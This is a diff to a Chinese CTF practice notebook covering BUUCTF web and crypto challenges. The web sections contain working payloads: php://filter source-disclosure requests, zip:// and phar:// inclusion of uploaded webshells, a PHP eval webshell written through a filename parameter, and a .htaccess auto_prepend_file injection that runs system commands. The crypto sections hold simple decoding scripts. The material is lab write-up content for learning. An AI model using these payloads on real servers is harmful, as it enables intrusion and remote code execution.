@@ -15,6 +15,8 @@ tags:
 [toc]
 
 # 刷 [BUUCTF](https://buuoj.cn/challenges)
+使用到的工具：
+1. [MD5](https://www.cmd5.com/)
 
 ## Basic
 
@@ -279,4 +281,203 @@ $cls->lover = $b;
 echo urlencode(serialize($cls));
 ?>
 ```
-### [](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
+### [Roamphp2-Myblog](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
+```
+GET /index.php?page=php://filter/read=convert.Base64-encode/resource=login HTTP/1.1
+
+GET /index.php?page=php://filter/read=convert.Base64-encode/resource=secret HTTP/1.1
+```
+```php
+<?php\nrequire_once("secret.php");\n
+mt_srand($secret_seed);\n
+$_SESSION[\'password\'] = mt_rand();\n?>\n'
+
+<?php\n$secret_seed = mt_rand();\n?>\n
+```
+登录失败页面
+```
+http://c6f1a9dc-119f-4e60-a86d-52adac541ade.node5.buuoj.cn:81/?page=admin/user
+
+GET /index.php?page=php://filter/read=convert.Base64-encode/resource=admin/user HTTP/1.1
+```
+```php
+if (isset($_POST[\'username\']) and isset($_POST[\'password\'])){\n\t
+if ($_POST[\'username\'] === "Longlone" and $_POST[\'password\'] == $_SESSION[\'password\']){  // No one knows my password, including 
+myself\n\t\t
+$logined = true;
+
+<?php
+if(isset($_FILES['Files']) and $_SESSION['status'] === true){
+    $tmp_file = $_FILES['Files']['name'];
+    $tmp_path = $_FILES['Files']['tmp_name'];
+    if(($extension = pathinfo($tmp_file)['extension']) != ""){
+        $allows = array('gif','jpeg','jpg','png');
+        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
+            $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
+            move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
+            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
+        } else {
+            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
+        }
+    }
+}
+?>
+```
+login页面产生password -> 登录提交SSID、username和password -> 后台对比password -> 提交抓包置空SSID和password绕过  
+
+phpinfo一句话码.php打包成.zip上传访问，zip://bagname#filename流中的文件都会被当成php，但get遇到#会解析故需要转义
+```
+GET /index.php?page=zip://./assets/img/upload/xxx_uploadname.jpg%23xxx_filename HTTP/1.1
+GET /index.php?page=phar://./assets/img/upload/xxx_uploadname.jpg/xxx_filename HTTP/1.1
+```
+页面均显示空白...  
+
+看了wp都是这个路，但本人尝试多遍均返回空白内容，返回200但Content-Length: 0，暂且记下
+
+### [Cross](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Cross)
+03页面中得到300个随机数
+
+### [easyphp](https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF2020]easyphp)
+```sh
+GET /?filename=test.php&content=<?php%20@eval($_POST['cmd']);?> HTTP/1.1
+```
+但访问test.php直接显示内容
+```
+<?php @eval($_POST['cmd']);?>
+Hello, world
+```
+也就是说，只有index.php能够作为php被解析。采用.htaccess配置auto_prepend_file注入，#(%23)注释，\(%5c)连接，\n(%0a)换行，;(%3b)，?(%3f)，>(%3e)
+```sh
+php_value auto_prepend_fil\
+e .htaccess
+#<?php system('cat /fla?'); ?>\
+
+?filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system('cat%20/fla?')%3B%3F%3E%5C
+
+
+
+php_value auto_prepend_fil\
+e .htaccess%
+#<?php @eval($_POST['cmd']);?>\
+Hello, world
+
+?filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20@eval($_POST['cmd'])%3B%3F%3E%5C
+```
+
+## Crypto
+### [1 base64](https://buuoj.cn/challenges#%E4%B8%80%E7%9C%BC%E5%B0%B1%E8%A7%A3%E5%AF%86)
+```sh
+ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=
+```
+### [2 MD5](https://buuoj.cn/challenges#MD5)
+```sh
+e00cf25ad42683b3df678c61f42c6bda
+```
+只能暴力短长度的，结果为admin1，算了几分钟。而[cmd5.com](https://www.cmd5.com/)里面秒级别地很快出结果。。。
+```py
+from hashlib import md5
+import string
+import itertools
+
+def trysimple(target_md5 = 'e00cf25ad42683b3df678c61f42c6bda', maxlen = 10):
+    found = False
+    charset = string.digits + string.ascii_lowercase
+    for curlen in range(1, maxlen):
+        print('curlen = ', curlen)
+        for part in itertools.product(charset, repeat=curlen):
+            part = ''.join(part)
+            part_md5 = md5(part.encode()).hexdigest()
+            if part_md5 == target_md5:
+                found = True
+                break
+        if found:
+            break
+    print(part if found else 'not found!!!')
+
+if __name__ == '__main__':
+    trysimple()
+```
+### [3 URL](https://buuoj.cn/challenges#Url%E7%BC%96%E7%A0%81)
+```
+%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d
+```
+### [4 Char Circle](https://buuoj.cn/challenges#%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2)
+根据前四位对应flag推出字母表循环前移13位
+```py
+import string
+
+content = 'synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}'
+
+# s->f, y->l, n->a, t->g, 
+print(ord('s') - ord('f'))
+print(ord('y') - ord('l'))
+print(ord('n') - ord('a'))
+print(ord('t') - ord('g'))
+# 13
+
+result = ''
+for c in content:
+    if c <= 'z' and c >= 'a':
+        cord = ord(c)
+        n = cord - 13
+        if n < ord('a'):
+            n += 26
+        result += chr(n)
+    else:
+        result += c
+print(result)
+```
+### [5 Morse Cipher](https://buuoj.cn/challenges#%E6%91%A9%E4%B8%9D)
+```
+.. .-.. --- ...- . -.-- --- ..-
+```
+```sh
+A: .-    B: -...    C: -.-.    D: -..    E: .    F: ..-.    G: --.    H: ....    I: ..    J: .---    K: -.-    L: .-..    M: --    N: -.    O: ---    P: .--.    Q: --.-    R: .-.    S: ...    T: -    U: ..-    V: ...-    W: .--    X: -..-    Y: -.--    Z: --..
+```
+### [6 password](https://buuoj.cn/challenges#password)
+### [7 Modified Caesar Cipher 变异凯撒](https://buuoj.cn/challenges#%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92)
+Caesar: new = (old + offset) % mod  标准凯撒通常只处理字母  
+Modifier Caesar: 每个字母使用不同的offset或不同的原表等...
+```py
+content = 'afZ_r9VYfScOeO_UL^RWUc'
+
+# a->f, f->l, Z->a, _->g, 
+print(ord('a') - ord('f'))
+print(ord('f') - ord('l'))
+print(ord('Z') - ord('a'))
+print(ord('_') - ord('g'))
+# -5, -6, -7, -8
+
+result = ''
+id = 5
+for c in content:
+    cord = ord(c)
+    n = cord + id
+    result += chr(n)
+    id += 1
+print(result)
+```
+### [8 Quoted-printable](https://buuoj.cn/challenges#Quoted-printable)
+Python 的 quopri 标准库就是专门用来处理 Quoted-printable 编码的
+```py
+import quopri
+
+encoded_text = "=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6"
+decoded_bytes = quopri.decodestring(encoded_text)
+decoded_text = decoded_bytes.decode('utf-8')
+print("解码结果:", decoded_text)
+```
+### [9](https://buuoj.cn/challenges#%E7%AF%B1%E7%AC%86%E5%A2%99%E7%9A%84%E5%BD%B1%E5%AD%90)
+根据前缀发现隔一个字符取一个字符，取完发现`flag{wethinkw`少了后半部分，隔的那些接上。
+```py
+encoded_text = "felhaagv{ewtehtehfilnakgw}"
+pre = ""
+last = ""
+for idx, c in enumerate(encoded_text):
+    if (idx & 1) == 1:
+        last += c
+    else:
+        pre += c
+print(pre + last)
+```
+### [10 Rabbit](https://buuoj.cn/challenges#Rabbit)
